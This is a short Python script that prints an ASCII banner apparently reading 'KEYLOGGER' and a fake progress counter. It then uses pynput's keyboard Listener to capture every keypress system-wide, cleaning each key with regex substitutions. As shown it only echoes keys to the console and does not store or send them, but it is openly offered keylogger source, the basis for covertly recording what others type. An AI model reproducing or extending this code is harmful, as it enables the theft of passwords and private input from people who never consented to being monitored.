print('        ||  ||   |||||| |||     ||| |||     |||||||| |||||||| ||||||||'),
print('        ||||||   |||      ||| |||   |||     ||    || ||    || ||    ||'),
print('        |||      |||        |||     |||     ||    || ||    || ||     '),
print('        || ||    ||||||     |||     |||     ||    || ||    || || ||||||'),
print('        ||  ||   |||        |||     |||     ||    || ||    || ||    ||'),
print('        ||   ||  ||||||     |||     ||||||| |||||||| |||||||| |||||||| '),
print(' 01%'),
print(' 02%'),
print(' 03%'),
print(' 04%'),
print(' 05%'),
print(' conplete...................%'),

from pynput.keyboard import Listener
import re


def capturar(tecla):
    tecla = str(tecla)
    print(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'Key.space', ' ', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)
    tecla = re.sub(r'Key.*', '', tecla)
    

with Listener(on_press=capturar) as l:
    l.join()